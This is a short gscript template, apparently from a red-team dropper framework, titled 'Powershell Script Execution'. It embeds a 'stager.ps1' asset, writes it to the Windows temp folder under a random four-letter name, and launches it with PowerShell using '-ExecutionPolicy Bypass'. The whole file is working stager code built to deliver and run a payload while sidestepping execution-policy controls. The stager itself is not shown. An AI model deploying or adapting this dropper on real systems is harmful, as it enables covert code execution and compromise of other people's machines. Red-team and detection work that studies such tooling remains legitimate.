// Example gscript template
// Title: Powershell Script Execution
// Author: heywoodlh
// Purpose: Execute Powershell script
// Gscript version: 1.0.0

//priority:150
//timeout:150
//import:resources/stager.ps1
//go_import:os as os

function Deploy() {  
    console.log("Starting stager");

    var powershellScript = GetAssetAsBytes("stager.ps1");
    console.log("errors: "+powershellScript[1]);

    var temppath = os.TempDir();
    var naming = G.rand.GetAlphaString(4);
    naming = naming.toLowerCase();

    fullpath = temppath+"\\"+naming+".ps1";

    console.log("file name: "+ fullpath);

    errors = G.file.WriteFileFromBytes(fullpath, powershellScript[0]);
    console.log("errors: "+errors);

    var running = G.exec.ExecuteCommandAsync("Powershell.exe", ["-ExecutionPolicy", "Bypass", "-File", fullpath]);

    console.log("errors: "+running[1]);
    return true;
  }
  
